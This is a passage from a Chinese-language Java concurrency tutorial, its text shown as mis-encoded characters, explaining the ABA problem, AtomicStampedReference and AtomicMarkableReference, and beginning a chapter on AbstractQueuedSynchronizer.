<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
<span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// âŒ è¿™ä¸¤ä¸ªæ“ä½œä¸æ˜¯åŸå­çš„</span>
count1.incrementAndGet();  <span class="hljs-comment">// æ“ä½œ1</span>
count2.incrementAndGet();  <span class="hljs-comment">// æ“ä½œ2</span>
<span class="hljs-comment">// é—®é¢˜ï¼šä¸¤ä¸ªæ“ä½œä¹‹é—´å¯èƒ½è¢«å…¶ä»–çº¿ç¨‹æ‰“æ–­</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¿™æ˜¯ä¸ªé—®é¢˜ï¼Ÿ</strong></p>
<ul>
<li>å¦‚æœéœ€è¦ä¿è¯count1å’Œcount2åŒæ—¶æ›´æ–°ï¼ŒCASæ— æ³•åšåˆ°</li>
<li>ä¸¤ä¸ªç‹¬ç«‹çš„CASæ“ä½œä¹‹é—´æ²¡æœ‰åŸå­æ€§ä¿è¯</li>
<li>å¯èƒ½å¯¼è‡´æ•°æ®ä¸ä¸€è‡´</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ol>
<li><strong>ä½¿ç”¨synchronized</strong>ï¼šå°†å¤šä¸ªæ“ä½œæ”¾åœ¨åŒæ­¥å—ä¸­</li>
<li><strong>ä½¿ç”¨é”</strong>ï¼šReentrantLockç­‰</li>
<li><strong>åˆå¹¶å˜é‡</strong>ï¼šå°†å¤šä¸ªå˜é‡åˆå¹¶ä¸ºä¸€ä¸ªå¯¹è±¡ï¼ŒCASæ›´æ–°æ•´ä¸ªå¯¹è±¡</li>
<li><strong>ä½¿ç”¨AtomicReference</strong>ï¼šå°†å¤šä¸ªå€¼å°è£…åœ¨ä¸€ä¸ªå¯¹è±¡ä¸­</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… æ–¹æ¡ˆ1ï¼šä½¿ç”¨synchronized</span>
<span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
    count1++;
    count2++;
}

<span class="hljs-comment">// âœ… æ–¹æ¡ˆ2ï¼šåˆå¹¶ä¸ºå¯¹è±¡</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CountPair</span> {
    <span class="hljs-type">int</span> count1, count2;
}
AtomicReference&lt;CountPair&gt; pair = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;();
</code></pre>
<h3 data-id="heading-112">5.4 ABAé—®é¢˜åŠè§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-113">ABAé—®é¢˜çš„äº§ç”Ÿåœºæ™¯</h4>
<p><strong>å…¸å‹åœºæ™¯ï¼šæ— é”æ ˆçš„å®ç°</strong></p>
<p>åœ¨å®ç°æ— é”æ•°æ®ç»“æ„ï¼ˆå¦‚æ ˆã€é˜Ÿåˆ—ï¼‰æ—¶ï¼ŒABAé—®é¢˜ç‰¹åˆ«å®¹æ˜“å‡ºç°ã€‚</p>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼ˆæ— é”æ ˆï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç®€åŒ–ç‰ˆæ— é”æ ˆ</span>
AtomicReference&lt;Node&gt; head = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;();

<span class="hljs-comment">// å‡ºæ ˆæ“ä½œ</span>
<span class="hljs-keyword">public</span> Node <span class="hljs-title function_">pop</span><span class="hljs-params">()</span> {
    Node oldHead;
    Node newHead;
    <span class="hljs-keyword">do</span> {
        oldHead = head.get();      <span class="hljs-comment">// 1. è¯»å–å¤´èŠ‚ç‚¹A</span>
        <span class="hljs-keyword">if</span> (oldHead == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        newHead = oldHead.next;    <span class="hljs-comment">// 2. å‡†å¤‡è®¾ç½®æ–°çš„å¤´èŠ‚ç‚¹</span>
        <span class="hljs-comment">// é—®é¢˜ï¼šå¦‚æœåœ¨æ­¥éª¤1å’Œ3ä¹‹é—´ï¼Œheadä»Aå˜æˆBå†å˜å›A</span>
        <span class="hljs-comment">// CASä»ç„¶ä¼šæˆåŠŸï¼Œä½†å®é™…ä¸Šå¤´èŠ‚ç‚¹å·²ç»è¢«æ¢è¿‡äº†ï¼</span>
    } <span class="hljs-keyword">while</span> (!head.compareAndSet(oldHead, newHead));  <span class="hljs-comment">// 3. CASæ›´æ–°</span>
    
    <span class="hljs-keyword">return</span> oldHead;
}
</code></pre>
<p><strong>ABAé—®é¢˜çš„æ—¶é—´çº¿ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">T1: çº¿ç¨‹1è¯»å– <span class="hljs-attr">head</span> = A
T2: çº¿ç¨‹2æ‰§è¡Œï¼š<span class="hljs-attr">head</span> = A -&gt; B -&gt; Aï¼ˆå…ˆpushå†popï¼Œåˆå›åˆ°Aï¼‰
T3: çº¿ç¨‹1æ‰§è¡ŒCAS(A, newHead)
    ç»“æœï¼šCASæˆåŠŸï¼ä½†æ­¤æ—¶Aå·²ç»ä¸æ˜¯åŸæ¥çš„Aäº†
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆä¼šæœ‰é—®é¢˜ï¼Ÿ</strong></p>
<ul>
<li>è™½ç„¶headçš„å€¼è¿˜æ˜¯Aï¼Œä½†AæŒ‡å‘çš„èŠ‚ç‚¹å¯èƒ½å·²ç»è¢«ä¿®æ”¹è¿‡</li>
<li>å¯èƒ½å¯¼è‡´æ•°æ®ä¸¢å¤±æˆ–é€»è¾‘é”™è¯¯</li>
<li>CASæ— æ³•æ£€æµ‹åˆ°"å€¼è¢«æ¢è¿‡"è¿™ä¸ªäº‹å®</li>
</ul>
<h4 data-id="heading-114">ç‰ˆæœ¬å·æœºåˆ¶ï¼ˆè§£å†³æ€è·¯ï¼‰</h4>
<p><strong>æ ¸å¿ƒæ€æƒ³ï¼š</strong> åœ¨å€¼çš„åŸºç¡€ä¸Šå¢åŠ ç‰ˆæœ¬å·ï¼Œæ¯æ¬¡ä¿®æ”¹ç‰ˆæœ¬å·é€’å¢</p>
<p><strong>ç”Ÿæ´»åŒ–ç†è§£ï¼š</strong></p>
<ul>
<li>å°±åƒç»™æ¯æ¬¡ä¿®æ”¹æ‰“ä¸Šæ—¶é—´æˆ³</li>
<li>å³ä½¿å€¼ç›¸åŒï¼Œç‰ˆæœ¬å·ä¹Ÿä¸åŒ</li>
<li>CASæ—¶åŒæ—¶æ£€æŸ¥å€¼å’Œç‰ˆæœ¬å·</li>
</ul>
<p><strong>å®ç°æ€è·¯ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¼ªä»£ç è¯´æ˜</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">VersionedValue</span> {
    Object value;     <span class="hljs-comment">// å®é™…å€¼</span>
    <span class="hljs-type">int</span> version;      <span class="hljs-comment">// ç‰ˆæœ¬å·</span>
}

<span class="hljs-comment">// CASæ“ä½œ</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSet</span><span class="hljs-params">(Object expectedValue, <span class="hljs-type">int</span> expectedVersion, 
                      Object newValue, <span class="hljs-type">int</span> newVersion)</span> {
    <span class="hljs-keyword">if</span> (currentValue == expectedValue &amp;&amp; currentVersion == expectedVersion) {
        <span class="hljs-comment">// å€¼å’Œç‰ˆæœ¬å·éƒ½åŒ¹é…ï¼Œæ‰æ›´æ–°</span>
        value = newValue;
        version = newVersion + <span class="hljs-number">1</span>;  <span class="hljs-comment">// ç‰ˆæœ¬å·é€’å¢</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… èƒ½æ£€æµ‹åˆ°ABAé—®é¢˜</li>
<li>âœ… ç‰ˆæœ¬å·é€’å¢ï¼Œä¸ä¼šé‡å¤</li>
<li>âœ… ç²¾ç¡®æ§åˆ¶æ¯æ¬¡ä¿®æ”¹</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>âš ï¸ éœ€è¦é¢å¤–çš„å­˜å‚¨ç©ºé—´ï¼ˆç‰ˆæœ¬å·ï¼‰</li>
<li>âš ï¸ å®ç°ç¨å¾®å¤æ‚ä¸€äº›</li>
</ul>
<h4 data-id="heading-115">AtomicStampedReferenceï¼ˆç‰ˆæœ¬å·è§£å†³æ–¹æ¡ˆï¼‰</h4>
<p><strong>AtomicStampedReference</strong>ï¼šJavaæä¾›çš„å¸¦ç‰ˆæœ¬å·çš„åŸå­å¼•ç”¨ç±»ï¼Œå¯ä»¥è§£å†³ABAé—®é¢˜ã€‚</p>
<p><strong>ä½¿ç”¨æ–¹å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicStampedReference;

<span class="hljs-comment">// åˆ›å»ºï¼šåˆå§‹å€¼ä¸º"A"ï¼Œç‰ˆæœ¬å·ä¸º0</span>
AtomicStampedReference&lt;String&gt; ref = 
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicStampedReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-number">0</span>);

<span class="hljs-comment">// è·å–å€¼å’Œç‰ˆæœ¬å·</span>
<span class="hljs-type">int</span>[] stampHolder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];  <span class="hljs-comment">// ç”¨äºæ¥æ”¶ç‰ˆæœ¬å·çš„æ•°ç»„</span>
<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> ref.get(stampHolder);
<span class="hljs-type">int</span> <span class="hljs-variable">version</span> <span class="hljs-operator">=</span> stampHolder[<span class="hljs-number">0</span>];    <span class="hljs-comment">// å½“å‰ç‰ˆæœ¬å·</span>

<span class="hljs-comment">// CASæ“ä½œï¼šåŒæ—¶æ¯”è¾ƒå€¼å’Œç‰ˆæœ¬å·</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> ref.compareAndSet(
    <span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>,        <span class="hljs-comment">// æœŸæœ›å€¼å’Œæ–°å€¼</span>
    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>             <span class="hljs-comment">// æœŸæœ›ç‰ˆæœ¬å·å’Œæ–°ç‰ˆæœ¬å·</span>
);

<span class="hljs-comment">// è®¾ç½®å€¼å’Œç‰ˆæœ¬å·</span>
ref.set(<span class="hljs-string">"C"</span>, <span class="hljs-number">2</span>);     <span class="hljs-comment">// è®¾ç½®å€¼ä¸º"C"ï¼Œç‰ˆæœ¬å·ä¸º2</span>
</code></pre>
<p><strong>è§£å†³ABAé—®é¢˜çš„ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicStampedReference&lt;String&gt; ref = 
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicStampedReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-number">0</span>);

<span class="hljs-comment">// çº¿ç¨‹1ï¼šå‡†å¤‡ä¿®æ”¹</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">int</span>[] stamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];
    <span class="hljs-type">String</span> <span class="hljs-variable">old</span> <span class="hljs-operator">=</span> ref.get(stamp);      <span class="hljs-comment">// è·å–å€¼å’Œç‰ˆæœ¬å·</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">oldVersion</span> <span class="hljs-operator">=</span> stamp[<span class="hljs-number">0</span>];        <span class="hljs-comment">// version = 0</span>
    
    Thread.sleep(<span class="hljs-number">1000</span>);
    
    <span class="hljs-comment">// CASï¼šåŒæ—¶æ£€æŸ¥å€¼å’Œç‰ˆæœ¬å·</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> ref.compareAndSet(
        old, <span class="hljs-string">"C"</span>, 
        oldVersion, oldVersion + <span class="hljs-number">1</span>
    );
    <span class="hljs-comment">// å¦‚æœçº¿ç¨‹2æ”¹è¿‡ï¼Œç‰ˆæœ¬å·å·²ç»ä¸æ˜¯0äº†ï¼ŒCASå¤±è´¥ âœ…</span>
});

<span class="hljs-comment">// çº¿ç¨‹2ï¼šA -&gt; B -&gt; A</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">int</span>[] stamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];
    <span class="hljs-type">String</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> ref.get(stamp);
    
    <span class="hljs-comment">// A -&gt; Bï¼Œç‰ˆæœ¬å· 0 -&gt; 1</span>
    ref.compareAndSet(current, <span class="hljs-string">"B"</span>, stamp[<span class="hljs-number">0</span>], stamp[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>);
    
    <span class="hljs-comment">// B -&gt; Aï¼Œç‰ˆæœ¬å· 1 -&gt; 2</span>
    current = ref.get(stamp);
    ref.compareAndSet(current, <span class="hljs-string">"A"</span>, stamp[<span class="hljs-number">0</span>], stamp[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>);
    <span class="hljs-comment">// æ­¤æ—¶å€¼è¿˜æ˜¯Aï¼Œä½†ç‰ˆæœ¬å·å·²ç»æ˜¯2äº†</span>
});

t1.start();
t2.start();
<span class="hljs-comment">// ç»“æœï¼šçº¿ç¨‹1çš„CASå¤±è´¥ï¼Œå› ä¸ºç‰ˆæœ¬å·ä¸åŒ¹é… âœ…</span>
</code></pre>
<p><strong>æ ¸å¿ƒæ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è·å–å€¼å’Œç‰ˆæœ¬å·</span>
V <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span>[] stampHolder)</span>  <span class="hljs-comment">// ç‰ˆæœ¬å·é€šè¿‡æ•°ç»„è¿”å›</span>

<span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®ï¼ˆåŒæ—¶æ¯”è¾ƒå€¼å’Œç‰ˆæœ¬å·ï¼‰</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSet</span><span class="hljs-params">(V expectedValue, V newValue,
                      <span class="hljs-type">int</span> expectedStamp, <span class="hljs-type">int</span> newStamp)</span>

<span class="hljs-comment">// è®¾ç½®å€¼å’Œç‰ˆæœ¬å·</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">set</span><span class="hljs-params">(V newValue, <span class="hljs-type">int</span> newStamp)</span>
</code></pre>
<h4 data-id="heading-116">AtomicMarkableReferenceï¼ˆæ ‡è®°ä½è§£å†³æ–¹æ¡ˆï¼‰</h4>
<p><strong>AtomicMarkableReference</strong>ï¼šä½¿ç”¨booleanæ ‡è®°ä»£æ›¿ç‰ˆæœ¬å·ï¼Œæ›´èŠ‚çœå†…å­˜ã€‚</p>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>åªéœ€è¦çŸ¥é“å€¼æ˜¯å¦è¢«ä¿®æ”¹è¿‡ï¼ˆä¸éœ€è¦çŸ¥é“ä¿®æ”¹äº†å‡ æ¬¡ï¼‰</li>
<li>å¯¹ç²¾åº¦è¦æ±‚ä¸é«˜</li>
<li>æƒ³èŠ‚çœå†…å­˜ï¼ˆbooleanæ¯”intå°ï¼‰</li>
</ul>
<p><strong>ä½¿ç”¨æ–¹å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicMarkableReference;

<span class="hljs-comment">// åˆ›å»ºï¼šåˆå§‹å€¼ä¸º"A"ï¼Œæ ‡è®°ä¸ºfalse</span>
AtomicMarkableReference&lt;String&gt; ref = 
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicMarkableReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-literal">false</span>);

<span class="hljs-comment">// è·å–å€¼å’Œæ ‡è®°</span>
<span class="hljs-type">boolean</span>[] markHolder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">1</span>];
<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> ref.get(markHolder);
<span class="hljs-type">boolean</span> <span class="hljs-variable">mark</span> <span class="hljs-operator">=</span> markHolder[<span class="hljs-number">0</span>];  <span class="hljs-comment">// å½“å‰æ ‡è®°</span>

<span class="hljs-comment">// CASæ“ä½œï¼šåŒæ—¶æ¯”è¾ƒå€¼å’Œæ ‡è®°</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> ref.compareAndSet(
    <span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>,        <span class="hljs-comment">// æœŸæœ›å€¼å’Œæ–°å€¼</span>
    <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>      <span class="hljs-comment">// æœŸæœ›æ ‡è®°å’Œæ–°æ ‡è®°</span>
);
</code></pre>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicMarkableReference&lt;String&gt; ref = 
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicMarkableReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-literal">false</span>);

<span class="hljs-comment">// çº¿ç¨‹1</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">boolean</span>[] mark = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">1</span>];
    <span class="hljs-type">String</span> <span class="hljs-variable">old</span> <span class="hljs-operator">=</span> ref.get(mark);
    <span class="hljs-type">boolean</span> <span class="hljs-variable">oldMark</span> <span class="hljs-operator">=</span> mark[<span class="hljs-number">0</span>];  <span class="hljs-comment">// false</span>
    
    Thread.sleep(<span class="hljs-number">1000</span>);
    
    <span class="hljs-comment">// CASï¼šæ£€æŸ¥å€¼å’Œæ ‡è®°</span>
    ref.compareAndSet(old, <span class="hljs-string">"C"</span>, oldMark, <span class="hljs-literal">true</span>);
    <span class="hljs-comment">// å¦‚æœçº¿ç¨‹2æ”¹è¿‡ï¼Œæ ‡è®°å·²ç»ä¸æ˜¯falseäº†ï¼ŒCASå¤±è´¥</span>
});

<span class="hljs-comment">// çº¿ç¨‹2ï¼šä¿®æ”¹å€¼å¹¶æ”¹å˜æ ‡è®°</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">boolean</span>[] mark = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">1</span>];
    <span class="hljs-type">String</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> ref.get(mark);
    
    <span class="hljs-comment">// ä¿®æ”¹å€¼ï¼Œæ ‡è®° false -&gt; true</span>
    ref.compareAndSet(current, <span class="hljs-string">"B"</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);
    <span class="hljs-comment">// å†æ”¹å›æ¥ï¼Œæ ‡è®° true -&gt; false</span>
    ref.compareAndSet(<span class="hljs-string">"B"</span>, <span class="hljs-string">"A"</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);
});
</code></pre>
<p><strong>å¯¹æ¯”æ€»ç»“ï¼š</strong></p>



































<table><thead><tr><th>ç‰¹æ€§</th><th>AtomicStampedReference</th><th>AtomicMarkableReference</th></tr></thead><tbody><tr><td><strong>æ ‡è®°ç±»å‹</strong></td><td>intï¼ˆç‰ˆæœ¬å·ï¼‰</td><td>booleanï¼ˆæ ‡è®°ï¼‰</td></tr><tr><td><strong>ç²¾åº¦</strong></td><td>âœ… é«˜ï¼ˆçŸ¥é“ä¿®æ”¹æ¬¡æ•°ï¼‰</td><td>âš ï¸ ä½ï¼ˆåªçŸ¥é“æ˜¯å¦ä¿®æ”¹è¿‡ï¼‰</td></tr><tr><td><strong>å†…å­˜å ç”¨</strong></td><td>âš ï¸ è¾ƒå¤§ï¼ˆint 4å­—èŠ‚ï¼‰</td><td>âœ… è¾ƒå°ï¼ˆboolean 1å­—èŠ‚ï¼‰</td></tr><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>éœ€è¦ç²¾ç¡®ç‰ˆæœ¬æ§åˆ¶</td><td>åªéœ€è¦æ ‡è®°æ˜¯å¦ä¿®æ”¹</td></tr><tr><td><strong>æ¨èä½¿ç”¨</strong></td><td>å¤§å¤šæ•°åœºæ™¯</td><td>å†…å­˜æ•æ„Ÿã€ç²¾åº¦è¦æ±‚ä¸é«˜çš„åœºæ™¯</td></tr></tbody></table>
<p><strong>é€‰æ‹©å»ºè®®ï¼š</strong></p>
<ul>
<li>å¤§å¤šæ•°æƒ…å†µä¸‹ä½¿ç”¨ <strong>AtomicStampedReference</strong>ï¼ˆæ›´ç²¾ç¡®ï¼‰</li>
<li>å¦‚æœåªéœ€è¦æ ‡è®°æ˜¯å¦ä¿®æ”¹è¿‡ï¼Œä¸”å†…å­˜ç´§å¼ ï¼Œä½¿ç”¨ <strong>AtomicMarkableReference</strong></li>
</ul>
<hr/>
<h2 data-id="heading-117">ç¬¬å…­ç«  AQSï¼ˆAbstractQueuedSynchronizerï¼‰</h2>
<h3 data-id="heading-118">6.1 AQSæ¦‚è¿°</h3>
<h4 data-id="heading-119">AQSçš„è®¾è®¡æ€æƒ³</h4>
<p>**AQSï¼ˆAbstractQueuedSynchronizerï¼‰**æ˜¯JUCåŒ…ä¸­å®ç°åŒæ­¥å™¨çš„åŸºç¡€æ¡†æ¶ï¼Œå¾ˆå¤šåŒæ­¥å·¥å…·ç±»éƒ½æ˜¯åŸºäºAQSå®ç°çš„ã€‚</p>
<p><strong>æ ¸å¿ƒæ€æƒ³ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨ä¸€ä¸ª<strong>volatile int state</strong>è¡¨ç¤ºåŒæ­¥çŠ¶æ€</li>
<li>ä½¿ç”¨<strong>FIFOé˜Ÿåˆ—</strong>ç®¡ç†ç­‰å¾…çº¿ç¨‹</li>
<li>é€šè¿‡<strong>CAS</strong>æ“ä½œæ›´æ–°çŠ¶æ€</li>
<li>é€šè¿‡<strong>æ¨¡æ¿æ–¹æ³•æ¨¡å¼</strong>ï¼Œå­ç±»å®ç°å…·ä½“çš„åŒæ­¥é€»è¾‘</li>
</ul>
<p><strong>è®¾è®¡æ¨¡å¼ï¼š</strong></p>
<ul>
<li>æ¨¡æ¿æ–¹æ³•æ¨¡å¼ï¼šå®šä¹‰ç®—æ³•éª¨æ¶ï¼Œå­ç±»å®ç°å…·ä½“æ­¥éª¤</li>
<li>çŠ¶æ€æ¨¡å¼ï¼šæ ¹æ®stateçš„ä¸åŒå€¼ï¼Œæ‰§è¡Œä¸åŒçš„é€»è¾‘</li>
</ul>
<h4 data-id="heading-120">AQSçš„æ ¸å¿ƒæ•°æ®ç»“æ„</h4>
<p><strong>ä¸»è¦ç»„æˆï¼š</strong></p>
<ol>
<li>
<p><strong>stateï¼ˆåŒæ­¥çŠ¶æ€ï¼‰</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> state; <span class="hljs-comment">// volatileä¿è¯å¯è§æ€§</span>
</code></pre>
</li>
<li>
<p><strong>ç­‰å¾…é˜Ÿåˆ—ï¼ˆCLHé˜Ÿåˆ—ï¼‰</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é˜Ÿåˆ—å¤´èŠ‚ç‚¹ï¼ˆè™šæ‹ŸèŠ‚ç‚¹ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Node head;
<span class="hljs-comment">// é˜Ÿåˆ—å°¾èŠ‚ç‚¹</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Node tail;
</code></pre>
</li>
<li>
<p><strong>NodeèŠ‚ç‚¹</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">SHARED</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(); <span class="hljs-comment">// å…±äº«æ¨¡å¼</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">EXCLUSIVE</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;    <span class="hljs-comment">// ç‹¬å æ¨¡å¼</span>
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CANCELLED</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// å–æ¶ˆçŠ¶æ€</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SIGNAL</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;    <span class="hljs-comment">// éœ€è¦å”¤é†’</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CONDITION</span> <span class="hljs-operator">=</span> -<span class="hljs-number">2</span>; <span class="hljs-comment">// åœ¨æ¡ä»¶é˜Ÿåˆ—ä¸­</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">PROPAGATE</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3</span>; <span class="hljs-comment">// ä¼ æ’­çŠ¶æ€</span>
    
    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> waitStatus;  <span class="hljs-comment">// ç­‰å¾…çŠ¶æ€</span>
    <span class="hljs-keyword">volatile</span> Node prev;       <span class="hljs-comment">// å‰é©±èŠ‚ç‚¹</span>
    <span class="hljs-keyword">volatile</span> Node next;       <span class="hljs-comment">// åç»§èŠ‚ç‚¹</span>
    <span class="hljs-keyword">volatile</span> Thread thread;   <span class="hljs-comment">// çº¿ç¨‹å¼•ç”¨</span>
    Node nextWaiter;          <span class="hljs-comment">// ä¸‹ä¸€ä¸ªç­‰å¾…èŠ‚ç‚¹</span>
}
</code></pre>
</li>
</ol>
<h4 data-id="heading-121">CLHé˜Ÿåˆ—</h4>
<p><strong>CLHé˜Ÿåˆ—çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>**CLHï¼ˆCraig, Landin, and Hagerstenï¼‰**æ˜¯ä¸€ç§è‡ªæ—‹é”é˜Ÿåˆ—</li>
<li>AQSå¯¹CLHé˜Ÿåˆ—è¿›è¡Œäº†æ”¹è¿›ï¼Œä½¿ç”¨åŒå‘é“¾è¡¨</li>
<li>ä½¿ç”¨è™šæ‹Ÿå¤´èŠ‚ç‚¹ï¼ˆheadï¼‰ç®€åŒ–æ“ä½œ</li>
<li>èŠ‚ç‚¹é€šè¿‡CASæ“ä½œå…¥é˜Ÿå’Œå‡ºé˜Ÿ</li>
</ul>
<p><strong>é˜Ÿåˆ—ç»“æ„ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">head</span> (è™šæ‹ŸèŠ‚ç‚¹)
  â†“
Node1 â†â†’ Node2 â†â†’ Node3 (<span class="hljs-built_in">tail</span>)
  â†‘        â†‘        â†‘
Thread1  Thread2  Thread3
</code></pre>
<h3 data-id="heading-122">6.2 AQSçš„æ ¸å¿ƒæ–¹æ³•</h3>
<h4 data-id="heading-123">tryAcquire/tryReleaseï¼ˆç‹¬å æ¨¡å¼ï¼‰</h4>
<p><strong>ç‹¬å æ¨¡å¼ï¼ˆExclusiveï¼‰ï¼š</strong> åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½è·å–é”ã€‚</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>ç‹¬å æ¨¡å¼å°±åƒåªæœ‰ä¸€ä¸ªåº§ä½çš„ä¼šè®®å®¤</li>
